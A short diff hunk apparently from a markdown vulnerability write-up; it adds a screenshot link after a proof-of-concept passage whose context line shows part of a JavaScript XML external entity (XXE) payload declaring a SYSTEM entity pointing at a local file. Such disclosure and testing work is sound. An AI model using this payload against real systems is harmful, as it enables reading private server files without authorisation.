@@ -224,3 +224,6 @@ let payload ="<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY test SYSTEM \"file
 	})
 ```
 if we run this file locally it returns true , so test is done.
+
+![Screenshot at 2021-07-21 12-50-50](https://user-images.githubusercontent.com/52857059/126530723-1d1e466b-825e-48a2-9d6b-5c0efc6d5ddc.png)
+
